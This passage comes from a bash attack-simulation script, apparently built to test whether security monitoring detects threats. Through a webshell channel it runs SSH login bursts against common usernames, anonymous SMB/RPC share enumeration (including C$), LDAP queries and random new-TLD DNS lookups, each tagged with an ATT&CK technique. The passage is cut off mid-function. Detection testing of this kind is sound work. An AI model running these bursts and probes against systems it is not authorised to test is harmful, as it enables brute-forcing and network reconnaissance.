                "end=\$((\$(date +%s) + ${minutes} * 60)); n=0; while [[ \$(date +%s) -lt \$end ]]; do ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o NumberOfPasswordPrompts=0 invaliduser@${target} exit </dev/null 2>&1 || true; n=\$((n+1)); sleep 1; done; echo SSH_BURST_DONE n=\$n" \
                2>/dev/null | sed -n 's/.*n=\([0-9][0-9]*\).*/\1/p' | tail -n 1)
            n=$(safe_int "${n}")
            (( n < 1 )) && n=$((minutes * 30))
            executed=$((executed + n))
            observed_total=$((observed_total + n))
        else
            n=$(run_ssh_auth_burst_for_host "${target}" "${attempts}")
            n=$(safe_int "${n}")
            executed=$((executed + n))
            observed_total=$((observed_total + n))
            state_append "ssh_auth_telemetry.log" "target=${target} attempted=${n}"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
            "$(( n > 0 ))" "ssh invalid-user auth burst" "0" "${elapsed}")
        poc_obs_log "EVIDENCE" "SSH follow-up ${target}:22 decision=${ssh_decision} attempts=${n}"
    done <<< "${targets}"

    SSH_ATTEMPTS_EXECUTED="${executed}"
    if (( observed_total > 0 )); then
        SSH_AUTH_FAILURES_OBSERVED="${observed_total}"
    else
        SSH_AUTH_FAILURES_OBSERVED="${executed}"
    fi
    followup_record_ssh "${executed}"
    poc_obs_log "SUMMARY" "SSH auth burst stage finished — planned=${planned} executed~${executed} observed~${SSH_AUTH_FAILURES_OBSERVED}"
    poc_obs_stage_end "SSH Follow-up"
    log_detection_quality "SSH Auth Burst" "${SSH_ATTEMPTS_EXECUTED:-0}" "${elapsed:-0}" "${host_count:-1}" \
        "ssh_auth_failure_burst" "$([[ "${SSH_ATTEMPTS_EXECUTED:-0}" -ge 30 ]] && printf high || printf medium)" \
        "${SSH_ATTEMPTS_EXECUTED:-0} invalid-user auth attempts across ${host_count:-1} SSH target(s)"
    set_stage_result "SSH Auth Burst" "Success" "planned=${planned} attempted=${SSH_AUTH_ATTEMPTED} executed~${executed} observed~${SSH_AUTH_FAILURES_OBSERVED}"
    write_report_entries "ssh_auth_burst" "T1110.001" "EDR/SIEM" "SSH Auth Failure Burst" "multi" "success" "executed=${executed}"
    save_ssh_auth_burst_overlap_result
}

save_ssh_auth_burst_overlap_result() {
    write_overlap_stage_result_env "ssh_auth_burst_result.env" \
        "SSH_ATTEMPTS_PLANNED" "${SSH_ATTEMPTS_PLANNED:-0}" \
        "SSH_ATTEMPTS_EXECUTED" "${SSH_ATTEMPTS_EXECUTED:-0}" \
        "SSH_AUTH_ATTEMPTED" "${SSH_AUTH_ATTEMPTED:-0}" \
        "SSH_AUTH_FAILURES_OBSERVED" "${SSH_AUTH_FAILURES_OBSERVED:-0}" \
        "FOLLOWUP_SSH_AUTH_FAILURES" "${FOLLOWUP_SSH_AUTH_FAILURES:-0}"
}

followup_stage_ssh() {
    if (( SSH_ATTEMPTS_EXECUTED > 0 )); then
        add_skipped_stage "SSH Follow-up" "Superseded by SSH Auth Burst stage"
        set_stage_result "SSH Follow-up" "Skipped" "SSH Auth Burst already executed"
        return 0
    fi
    local nodes target users user ssh_status="Success" ssh_reason="" attempts="${SSH_AUTH_FAILURE_TARGET}"
    local -a usernames=(invaliduser admin root test guest operator backup svc www postgres deploy azureuser)
    local ssh_idx=0 ssh_total precheck_line precheck_cmd precheck_ec precheck_out classification ssh_decision t0 t1 elapsed n
    poc_obs_stage_start "SSH Follow-up"
    nodes=$(get_followup_hosts "ssh_hosts.txt")
    if [[ -z "${nodes}" ]]; then
        poc_obs_record_followup "SSH Login Simulation" "n/a" "22" "not_found" "ssh" "n/a" "0" "no SSH targets discovered" \
            "config_missing" false false "" "0" "0" || true
        add_skipped_stage "SSH Follow-up" "No SSH targets discovered"
        set_stage_result "SSH Follow-up" "Skipped" "No SSH targets discovered (decision=skipped_config_missing)"
        poc_obs_stage_end "SSH Follow-up"
        return 0
    fi
    add_executed_stage "SSH Follow-up"
    write_report_entries "ssh_followup" "T1110/T1021.004" "NDR/SIEM" "Failed SSH Login" "multi" "start" "auth failure burst intensity=${FOLLOWUP_INTENSITY}"
    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_ssh "$(( $(count_hosts_blob "${nodes}") * attempts ))"
        set_stage_result "SSH Follow-up" "Success" "dry-run"
        return 0
    fi
    ssh_total=$(count_hosts_blob "${nodes}")
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        ssh_idx=$((ssh_idx + 1))
        poc_obs_log "INFO" "SSH Follow-up Progress: ${ssh_idx}/${ssh_total} targets processed"
        precheck_line=$(poc_precheck_ssh "${target}" 22)
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_followup "${classification}"; then
            ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "SSH follow-up skipped for ${target}:22 decision=${ssh_decision}"
            continue
        fi
        t0=$(date +%s)
        n=0
        if [[ "${HAS_ssh:-false}" == true ]]; then
            run_webshell "ssh-aggressive-${target}" \
                "${REMOTE_SHELL_HELPERS}
users='invaliduser admin root test guest operator backup svc www postgres deploy'
for i in \$(seq_list ${attempts}); do
  u=\$(echo \"\$users\" | tr ' ' '\\n' | sed -n \"\$((1+RANDOM%10))p\")
  ssh -o BatchMode=yes -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 \
    -o NumberOfPasswordPrompts=0 \"\${u}@${target}\" 'exit' </dev/null >/dev/null 2>&1 || true
  sleep \$((RANDOM%2))
done" >/dev/null
            followup_record_ssh "${attempts}"
            n="${attempts}"
        else
            local tcp_ssh_probe
            tcp_ssh_probe=$(build_remote_tcp_probe "${target}" 22)
            run_webshell "ssh-tcp-burst-${target}" \
                "${REMOTE_SHELL_HELPERS} for i in \$(seq_list ${attempts}); do ${tcp_ssh_probe}; sleep \$((RANDOM%2)); done" >/dev/null
            ssh_status="Fallback"
            ssh_reason="ssh missing; TCP/22 reconnect burst"
            followup_record_ssh "${attempts}"
            n="${attempts}"
            add_fallback_usage "SSH follow-up: TCP/22 burst (no password prompts)"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
            "$(( n > 0 ))" "ssh auth failure burst" "0" "${elapsed}")
        poc_obs_log "EVIDENCE" "SSH follow-up ${target}:22 decision=${ssh_decision}"
    done <<< "${nodes}"
    poc_obs_stage_end "SSH Follow-up"
    poc_obs_log "SUMMARY" "SSH follow-up stage finished — status=${ssh_status}"
    set_stage_result "SSH Follow-up" "${ssh_status}" "${ssh_reason}"
    write_report_entries "ssh_followup" "T1110/T1021.004" "NDR/SIEM" "Failed SSH Login" "multi" "success" "ssh auth-failure telemetry (${FOLLOWUP_SSH_AUTH_FAILURES})"
}

followup_stage_smb() {
    local smb_nodes target probes="${SMB_PROBE_TARGET}" i
    local smb_idx=0 smb_total precheck_line precheck_cmd precheck_ec precheck_out classification smb_decision t0 t1 elapsed
    poc_obs_stage_start "SMB Follow-up"
    smb_nodes=$(get_followup_hosts "smb_hosts.txt")
    if [[ -z "${smb_nodes}" ]]; then
        poc_obs_record_followup "SMB Enumeration" "n/a" "445" "not_found" "smb" "n/a" "0" "no SMB targets" \
            "config_missing" false false "" "0" "0" || true
        add_skipped_stage "Windows/SMB Follow-up" "No SMB targets discovered"
        set_stage_result "Windows Telemetry" "Skipped" "No SMB targets discovered (decision=skipped_config_missing)"
        poc_obs_stage_end "SMB Follow-up"
        return 0
    fi
    add_executed_stage "Windows Telemetry"
    write_report_entries "windows_telemetry" "T1135/T1021.002" "NDR/XDR" "SMB Enumeration" "multi" "start" "aggressive SMB/RPC probes"
    local smb_host_n
    smb_host_n=$(count_hosts_blob "${smb_nodes}")
    SMB_PROBES_PLANNED=$((smb_host_n * probes))
    SMB_PROBES_ATTEMPTED="${SMB_PROBES_PLANNED}"
    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_smb "${SMB_PROBES_PLANNED}"
        set_stage_result "Windows Telemetry" "Success" "dry-run"
        return 0
    fi
    smb_total=$(count_hosts_blob "${smb_nodes}")
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        pipeline_stop_requested && break
        smb_idx=$((smb_idx + 1))
        poc_obs_log "INFO" "SMB Follow-up Progress: ${smb_idx}/${smb_total} targets processed"
        precheck_line=$(poc_precheck_smb "${target}" 445)
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_followup "${classification}"; then
            smb_decision=$(poc_obs_record_followup "SMB Enumeration" "${target}" "445" "open" "smb" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "SMB follow-up skipped for ${target}:445 decision=${smb_decision}"
            continue
        fi
        t0=$(date +%s)
        if [[ "${HAS_smbclient:-false}" == true || "${HAS_rpcclient:-false}" == true ]]; then
            run_webshell "smb-aggressive-${target}" \
                "${REMOTE_SHELL_HELPERS}
for i in \$(seq_list ${probes}); do
  smbclient -L //${target} -N -U '' >/dev/null 2>&1 || true
  smbclient //${target}/IPC\\\$ -N -U '' -c 'ls' >/dev/null 2>&1 || true
  smbclient //${target}/C\\\$ -N -U '' -c 'ls' >/dev/null 2>&1 || true
  rpcclient -N -U '' '${target}' -c 'srvinfo; netshareenumall' >/dev/null 2>&1 || true
  poc_port_probe '${target}' 445 || true
  sleep \$((RANDOM%2))
done" >/dev/null
            followup_record_smb "${probes}"
            SMB_PROBES_CONNECTED=$((SMB_PROBES_CONNECTED + probes))
        else
            local tcp_smb
            tcp_smb=$(build_remote_tcp_probe "${target}" 445)
            run_webshell "smb-tcp-burst-${target}" \
                "${REMOTE_SHELL_HELPERS} for i in \$(seq_list ${probes}); do ${tcp_smb}; poc_port_probe '${target}' 139 || true; sleep 1; done" >/dev/null
            followup_record_smb "${probes}"
            SMB_PROBES_CONNECTED=$((SMB_PROBES_CONNECTED + probes / 2))
            add_fallback_usage "SMB follow-up: TCP/445 enumeration burst"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        smb_decision=$(poc_obs_record_followup "SMB Enumeration" "${target}" "445" "open" "smb" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true true \
            "smbclient/rpcclient burst" "0" "${elapsed}")
        poc_obs_log "EVIDENCE" "SMB follow-up ${target}:445 decision=${smb_decision}"
    done <<< "${smb_nodes}"
    poc_obs_stage_end "SMB Follow-up"
    poc_obs_log "SUMMARY" "SMB follow-up stage finished"
    local ldap_nodes
    ldap_nodes=$(get_local_hosts "ldap_hosts.txt")
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        if [[ "${HAS_ldapsearch:-false}" == true ]]; then
            run_webshell "ldap-aggressive-${target}" \
                "ldapsearch -x -H ldap://${target} -s base -b '' namingcontexts defaultNamingContext supportedLDAPVersion >/dev/null 2>&1 || true" \
                >/dev/null
            followup_record_smb 3
        else
            run_webshell "ldap-tcp-${target}" "$(build_remote_tcp_probe "${target}" 389)" >/dev/null
            followup_record_smb 1
        fi
    done <<< "${ldap_nodes}"
    set_stage_result "Windows Telemetry" "Success" "aggressive SMB/LDAP probes (${FOLLOWUP_INTENSITY})"
    write_report_entries "windows_telemetry" "T1135" "NDR/XDR" "SMB Enumeration" "multi" "success" "smb/ldap burst complete"
}

dns_new_tld_primary_pool() {
    printf '%s\n' click xyz link bid works fun top win onl diet page icu wiki pw design team
}

dns_new_tld_secondary_pool() {
    printf '%s\n' zip mov lol quest monster skin cyou site online shop
}

dns_new_tld_service_prefixes() {
    printf '%s\n' forms api cdn assets sync edge img portal cache
}

append_dns_new_tld_log() {
    local msg="$1"
    state_append "dns_new_tld_test.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
}

dns_new_tld_log_both() {
    local msg="$1"
    append_dns_new_tld_log "${msg}"
    log_message "OK" "DNS New TLD: ${msg}" >&2
}

dns_new_tld_resolve_query_tool() {
    DNS_NEW_TLD_QUERY_TOOL=""
    if [[ "${HAS_dig:-false}" == true ]]; then
        DNS_NEW_TLD_QUERY_TOOL="dig"
        return 0
    fi
    if [[ "${HAS_nslookup:-false}" == true ]]; then
        DNS_NEW_TLD_QUERY_TOOL="nslookup"
        return 0
    fi
    if [[ "${HAS_host:-false}" == true ]]; then
        DNS_NEW_TLD_QUERY_TOOL="host"
        return 0
    fi
    DNS_NEW_TLD_SKIP_REASON="dns_tool_missing"
    return 1
}

dns_new_tld_compute_detection_likelihood() {
    local unique_tlds="$1" tested_domains="$2"
    unique_tlds=$(safe_int "${unique_tlds}")
    tested_domains=$(safe_int "${tested_domains}")
    DNS_NEW_TLD_DETECTION_LIKELIHOOD="LOW"
    DNS_NEW_TLD_DETECTION_REASON="insufficient_tld_diversity"
    if (( unique_tlds >= 5 && tested_domains >= 10 )); then
        DNS_NEW_TLD_DETECTION_LIKELIHOOD="HIGH"
        DNS_NEW_TLD_DETECTION_REASON="diverse_new_tld_burst"
        return 0
    fi
    if (( unique_tlds >= 3 && unique_tlds <= 4 )); then
        DNS_NEW_TLD_DETECTION_LIKELIHOOD="MEDIUM"
        DNS_NEW_TLD_DETECTION_REASON="moderate_new_tld_diversity"
        return 0
    fi
    if (( unique_tlds <= 2 )); then
        DNS_NEW_TLD_DETECTION_REASON="low_tld_diversity"
    fi
}

validate_dns_fqdn() {
    local fqdn="$1" reason_var="${2:-}"
    local label="" len=0 total=0
    fqdn=$(printf '%s' "${fqdn}" | tr '[:upper:]' '[:lower:]' | sed 's/^[.]//;s/[.]$//')
    [[ -z "${fqdn}" ]] && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"; return 1; }
    [[ "${fqdn}" == *".."* || "${fqdn}" == *" "* || "${fqdn}" == *$'\t'* ]] && {
        [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"
        return 1
    }
    if [[ ! "${fqdn}" =~ ^[a-z0-9]([a-z0-9.-]*[a-z0-9])?$ ]]; then
        [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "bad_character"
        return 1
    fi
    total=${#fqdn}
    (( total > 253 )) && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"; return 1; }
    while IFS= read -r label; do
        [[ -z "${label}" ]] && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"; return 1; }
        len=${#label}
        (( len > 63 )) && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "label_too_long"; return 1; }
        [[ ! "${label}" =~ ^[a-z0-9]([a-z0-9-]*[a-z0-9])?$ ]] && {
            [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "bad_character"
            return 1
        }
    done < <(printf '%s' "${fqdn}" | tr '.' '\n')
    [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "ok"
    return 0
}

dns_new_tld_classify_failure_root_cause() {
    local out="$1" payload="$2"
    local low="" rc=""
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${low}" == *dns_payload_syntax_error* ]]; then
        printf '%s' "payload_encode_failure"
        return 0
    fi
    if [[ "${low}" == *dns_new_tld_root_cause=* ]]; then
        rc=$(printf '%s\n' "${out}" | tr -d '\r' | sed -n 's/.*DNS_NEW_TLD_ROOT_CAUSE=\([^[:space:]]*\).*/\1/p' | tail -n1)
        [[ -n "${rc}" ]] && printf '%s' "${rc}" && return 0
    fi
    rc=$(poc_classify_dns_dga_root_cause "DNS_NEW_TLD" "${payload}" "${out}" | head -n1 || true)
    case "${rc}" in
        resolver_unreachable) printf '%s' "resolver_failure" ;;
        dns_connectivity_failure|all_queries_timeout) printf '%s' "resolver_failure" ;;
        DIG_MISSING|dns_tool_missing) printf '%s' "dig_failure" ;;
        dns_query_failed) printf '%s' "dig_failure" ;;
        heredoc_termination_corruption|function_scope_corruption|payload_truncated|payload_syntax_error|webshell_transport_limit)
            printf '%s' "payload_encode_failure" ;;
        COMMAND_TIMEOUT|webshell_timeout) printf '%s' "resolver_failure" ;;
        invalid_tld_pool) printf '%s' "invalid_fqdn" ;;
        *) printf '%s' "unknown" ;;
    esac
}

dns_new_tld_log_root_cause() {
    local cause="$1" detail="${2:-}"
    DNS_NEW_TLD_LAST_ROOT_CAUSE="${cause}"
    dns_new_tld_log_both "DNS_NEW_TLD_ROOT_CAUSE=${cause} detail=${detail}"
    dns_new_tld_log_both "ROOT_CAUSE=${cause} module=DNS_NEW_TLD detail=${detail}"
}

build_dns_new_tld_simulation_remote_cmd() {
    local resolver="$1" domain_count="$2" tool="$3"
    domain_count=$(safe_int "${domain_count}")
    (( domain_count < DNS_NEW_TLD_MIN_DOMAINS )) && domain_count="${DNS_NEW_TLD_MIN_DOMAINS}"
    (( domain_count > DNS_NEW_TLD_MAX_DOMAINS )) && domain_count="${DNS_NEW_TLD_MAX_DOMAINS}"
    remote_bash_script_open 'DNS_NEW_TLD_SCRIPT'
    cat <<EOF
primary_tlds='click xyz link bid works fun top win onl diet page icu wiki pw design team'
secondary_tlds='zip mov lol quest monster skin cyou site online shop'
prefixes='forms api cdn assets sync edge img portal cache'
srv='${resolver}'
tool='${tool}'
domain_n=${domain_count}
queries=0; ok_q=0; fail_q=0; domains=0; generated=0; valid_fqdns=0; invalid_fqdns=0
a_q=0; aaaa_q=0; https_q=0; txt_q=0
tld_stats=''
seen_tlds=''
tested_tlds=''
dns_nt_rand_label(){
  n=\$((8 + RANDOM % 13))
  if [ -r /dev/urandom ]; then
    s=\$(head -c 32 /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' | head -c "\${n}")
  else
    s=\$(printf '%s%s' "\$RANDOM" "\$RANDOM" | tr -dc 'a-z0-9' | head -c "\${n}")
  fi
  [ -n "\$s" ] || s="poc\${RANDOM}"
  printf '%s' "\$s"
}
dns_nt_pick_tld(){
  local idx=\$1
  if [ "\$idx" -le 16 ]; then
    echo "\$primary_tlds" | tr ' ' '\\n' | sed -n "\${idx}p"
  else
    echo "\$secondary_tlds" | tr ' ' '\\n' | sed -n "\$((idx - 16))p"
  fi
}
dns_nt_pick_prefix(){
  echo "\$prefixes" | tr ' ' '\\n' | sed -n "\$((1 + RANDOM % 8))p"
}
dns_nt_pick_qtype(){
  r=\$((RANDOM % 10))
  if [ "\$r" -lt 4 ]; then printf 'A'
  elif [ "\$r" -lt 6 ]; then printf 'AAAA'
  elif [ "\$r" -lt 8 ]; then printf 'HTTPS'
  else printf 'TXT'; fi
}
dns_nt_is_to(){ case "\$1" in *timed\ out*|*TIMEOUT*|*refused*|*unreachable*|*no\ servers*) return 0;; esac; return 1; }
dns_nt_is_ok(){ case "\$1" in *NXDOMAIN*|*"not found"*|*can't\ find*|*IN[[:space:]]*|*has\ address*|*Address:*|*ANSWER\ SECTION*) return 0;; esac; return 1; }
dns_nt_validate_fqdn(){
  local fqdn="\$1" label="" len=0 total=0 reason=""
  fqdn=\$(printf '%s' "\$fqdn" | tr '[:upper:]' '[:lower:]' | sed 's/^[.]//;s/[.]$//')
  [ -z "\$fqdn" ] && { echo invalid_fqdn; return 1; }
  case "\$fqdn" in *" "*|*".."*) echo invalid_fqdn; return 1;; esac
  total=\${#fqdn}
  [ "\$total" -gt 253 ] 2>/dev/null && { echo invalid_fqdn; return 1; }
  for label in \$(printf '%s' "\$fqdn" | tr '.' ' '); do
    [ -z "\$label" ] && { echo invalid_fqdn; return 1; }
    len=\${#label}
    [ "\$len" -gt 63 ] 2>/dev/null && { echo label_too_long; return 1; }
    printf '%s' "\$label" | grep -qE '^[a-z0-9]([a-z0-9-]*[a-z0-9])?$' || { echo bad_character; return 1; }
  done
  echo ok
  return 0
}
dns_nt_elapsed_ms(){
  t1=\$(date +%s%3N 2>/dev/null || date +%s)
  t0=\$1
  printf '%s' \$((t1 - t0))
}
dns_nt_run_query(){
  local dom="\$1" tld="\$2" qtype="\$3" out="" res="error" el=0 t0=0
  t0=\$(date +%s%3N 2>/dev/null || date +%s)
  queries=\$((queries + 1))
  printf 'QUERY_GENERATED fqdn=%s qtype=%s stage=dns_new_tld\n' "\$dom" "\$qtype"
  case "\$qtype" in
    A) a_q=\$((a_q + 1));;
    AAAA) aaaa_q=\$((aaaa_q + 1));;
    HTTPS) https_q=\$((https_q + 1));;
    TXT) txt_q=\$((txt_q + 1));;
  esac
  if [ "\$tool" = nslookup ]; then
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then
      if [ "\$qtype" = TXT ]; then out=\$(nslookup -timeout=2 -type=TXT "\$dom" 2>&1)
      elif [ "\$qtype" = AAAA ]; then out=\$(nslookup -timeout=2 -type=AAAA "\$dom" 2>&1)
      else out=\$(nslookup -timeout=2 "\$dom" 2>&1); fi
    else
      if [ "\$qtype" = TXT ]; then out=\$(nslookup -timeout=2 -type=TXT "\$dom" "\$srv" 2>&1)
      elif [ "\$qtype" = AAAA ]; then out=\$(nslookup -timeout=2 -type=AAAA "\$dom" "\$srv" 2>&1)
      else out=\$(nslookup -timeout=2 "\$dom" "\$srv" 2>&1); fi
    fi
  elif [ "\$tool" = host ]; then
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then out=\$(host -W 2 -t "\$qtype" "\$dom" 2>&1)
    else out=\$(host -W 2 -t "\$qtype" "\$dom" "\$srv" 2>&1); fi
  else
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then
      if [ "\$qtype" = HTTPS ]; then out=\$(dig +time=2 +tries=1 "\$dom" HTTPS +noall +answer +comments 2>&1); [ -z "\$out" ] && out=\$(dig +time=2 +tries=1 "\$dom" TYPE65 +noall +answer +comments 2>&1)
      else out=\$(dig +time=2 +tries=1 "\$dom" "\$qtype" +noall +answer +comments 2>&1); fi
    else
      if [ "\$qtype" = HTTPS ]; then out=\$(dig +time=2 +tries=1 @"\$srv" "\$dom" HTTPS +noall +answer +comments 2>&1); [ -z "\$out" ] && out=\$(dig +time=2 +tries=1 @"\$srv" "\$dom" TYPE65 +noall +answer +comments 2>&1)
      else out=\$(dig +time=2 +tries=1 @"\$srv" "\$dom" "\$qtype" +noall +answer +comments 2>&1); fi
    fi
  fi
  printf 'QUERY_SENT fqdn=%s qtype=%s stage=dns_new_tld\n' "\$dom" "\$qtype"
  el=\$(dns_nt_elapsed_ms "\$t0")
  if dns_nt_is_to "\$out"; then res=timeout; fail_q=\$((fail_q + 1))
    printf 'QUERY_TIMEOUT fqdn=%s qtype=%s stage=dns_new_tld\n' "\$dom" "\$qtype"
  elif dns_nt_is_ok "\$out"; then res=ok; ok_q=\$((ok_q + 1))
  else res=error; fail_q=\$((fail_q + 1)); printf 'QUERY_ERROR fqdn=%s qtype=%s stage=dns_new_tld reason=resolver_error\n' "\$dom" "\$qtype"; fi
  printf 'QUERY_RESPONSE fqdn=%s qtype=%s stage=dns_new_tld rcode=%s\n' "\$dom" "\$qtype" "\$res"
  printf 'DNS_NEW_TLD_QUERY domain=%s tld=%s query_type=%s resolver=%s result=%s elapsed_ms=%s\n' "\$dom" "\$tld" "\$qtype" "\$srv" "\$res" "\$el"
}
dns_nt_tld_bump(){
  local t="\$1"
  case " \${seen_tlds} " in *" \${t} "*) ;;
  *) seen_tlds="\${seen_tlds} \${t}"; tested_tlds="\${tested_tlds} \${t}";; esac
  local cur=0
  cur=\$(printf '%s' "\$tld_stats" | tr ' ' '\\n' | awk -v t="\$t" -F= '\$1=="tld"&&\$2==t{getline; if(\$1=="queries") print \$2}')
  [ -z "\$cur" ] && cur=0
  tld_stats="\${tld_stats} tld=\${t} queries=\$((cur+1))"
}
echo "DNS_NEW_TLD_TEST_START resolver=\$srv tool=\$tool planned_domains=\$domain_n"
i=1
while [ "\$i" -le "\$domain_n" ]; do
  tld=\$(dns_nt_pick_tld "\$i")
  [ -z "\$tld" ] && tld=click
  pref=\$(dns_nt_pick_prefix)
  lbl=\$(dns_nt_rand_label)
  dom="\${pref}.\${lbl}.\${tld}"
  qtype=\$(dns_nt_pick_qtype)
  generated=\$((generated + 1))
  fqdn_valid=\$(dns_nt_validate_fqdn "\$dom" || true)
  if [ "\$fqdn_valid" != ok ]; then
    invalid_fqdns=\$((invalid_fqdns + 1))
    printf 'DNS_NEW_TLD_QUERY fqdn=%s query_type=%s tld=%s valid=no reason=%s\n' "\$dom" "\$qtype" "\$tld" "\${fqdn_valid:-invalid_fqdn}"
    fail_q=\$((fail_q + 1))
    i=\$((i + 1))
    sleep "0.\$(printf '%02d' \$((2 + RANDOM % 8)))"
    continue
  fi
  valid_fqdns=\$((valid_fqdns + 1))
  domains=\$((domains + 1))
  printf 'DNS_NEW_TLD_QUERY fqdn=%s query_type=%s tld=%s valid=yes\n' "\$dom" "\$qtype" "\$tld"
  dns_nt_tld_bump "\$tld"
  dns_nt_run_query "\$dom" "\$tld" "\$qtype"
  i=\$((i + 1))
  sleep "0.\$(printf '%02d' \$((2 + RANDOM % 8)))"
done
unique_tlds=0
for t in \$seen_tlds; do unique_tlds=\$((unique_tlds + 1)); done
for t in \$seen_tlds; do
  u=0
  for d in \$tested_tlds; do [ "\$d" = "\$t" ] && u=\$((u+1)); done
  printf 'DNS_NEW_TLD_TLD_STATS tld=%s queries=%s unique_domains=%s\n' "\$t" "\$(printf '%s' "\$tld_stats" | tr ' ' '\\n' | awk -v tl="\$t" '\$1=="tld"&&\$2==tl{getline; if(\$1=="queries") print \$2}')" "\$u"
done
query_types="A=\${a_q}/AAAA=\${aaaa_q}/HTTPS=\${https_q}/TXT=\${txt_q}"
printf 'DNS_NEW_TLD_SUMMARY tested_domains=%s tested_tlds=%s unique_tlds=%s query_count=%s query_types=%s successful_queries=%s failed_queries=%s generated=%s valid=%s invalid=%s duration_seconds=0 detection_likelihood=LOW\n' \
  "\$domains" "\$tested_tlds" "\$unique_tlds" "\$queries" "\$query_types" "\$ok_q" "\$fail_q" "\$generated" "\$valid_fqdns" "\$invalid_fqdns"
EOF
    remote_bash_script_close 'DNS_NEW_TLD_SCRIPT'
}

parse_dns_new_tld_output() {
    local out="$1"
    local summary="" line="" tld="" domains=0 unique=0 queries=0 ok_q=0 fail_q=0
    local a_q=0 aaaa_q=0 https_q=0 txt_q=0 tested_tlds="" query_types=""
    local generated=0 valid=0 invalid=0
    summary=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_NEW_TLD_SUMMARY' | tail -n1 || true)
    [[ -z "${summary}" ]] && return 1
    domains=$(safe_int "$(dns_stats_field_from_line "${summary}" tested_domains)")
    unique=$(safe_int "$(dns_stats_field_from_line "${summary}" unique_tlds)")
    queries=$(safe_int "$(dns_stats_field_from_line "${summary}" query_count)")
    ok_q=$(safe_int "$(dns_stats_field_from_line "${summary}" successful_queries)")
    fail_q=$(safe_int "$(dns_stats_field_from_line "${summary}" failed_queries)")
    generated=$(safe_int "$(dns_stats_field_from_line "${summary}" generated)")
    valid=$(safe_int "$(dns_stats_field_from_line "${summary}" valid)")
    invalid=$(safe_int "$(dns_stats_field_from_line "${summary}" invalid)")
    DNS_NEW_TLD_GENERATED="${generated}"
    DNS_NEW_TLD_VALID_FQDNS="${valid}"
    DNS_NEW_TLD_INVALID_FQDNS="${invalid}"
    tested_tlds=$(dns_stats_field_from_line "${summary}" tested_tlds)
    query_types=$(dns_stats_field_from_line "${summary}" query_types)
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ "${line}" != DNS_NEW_TLD_QUERY* ]] && continue
        case "${line}" in
            *query_type=A*) a_q=$((a_q + 1)) ;;
            *query_type=AAAA*) aaaa_q=$((aaaa_q + 1)) ;;
            *query_type=HTTPS*) https_q=$((https_q + 1)) ;;
            *query_type=TXT*) txt_q=$((txt_q + 1)) ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | grep -E '^DNS_NEW_TLD_QUERY' || true)"
    if (( a_q + aaaa_q + https_q + txt_q == 0 )) && [[ -n "${query_types}" ]]; then
        a_q=$(safe_int "$(sed -n 's/.*A=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        aaaa_q=$(safe_int "$(sed -n 's/.*AAAA=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        https_q=$(safe_int "$(sed -n 's/.*HTTPS=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        txt_q=$(safe_int "$(sed -n 's/.*TXT=\([0-9]*\).*/\1/p' <<< "${query_types}")")
    fi
    DNS_NEW_TLD_TESTED_DOMAINS="${domains}"
    DNS_NEW_TLD_UNIQUE_TLDS="${unique}"
    DNS_NEW_TLD_QUERY_COUNT="${queries}"
    DNS_NEW_TLD_SUCCESSFUL_QUERIES="${ok_q}"
    DNS_NEW_TLD_FAILED_QUERIES="${fail_q}"
    DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT="${queries}"
    DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=$((ok_q + fail_q))
    DNS_NEW_TLD_TESTED_TLDS="${tested_tlds}"
    DNS_NEW_TLD_QUERY_TYPES="${query_types}"
    DNS_NEW_TLD_A_QUERIES="${a_q}"
    DNS_NEW_TLD_AAAA_QUERIES="${aaaa_q}"
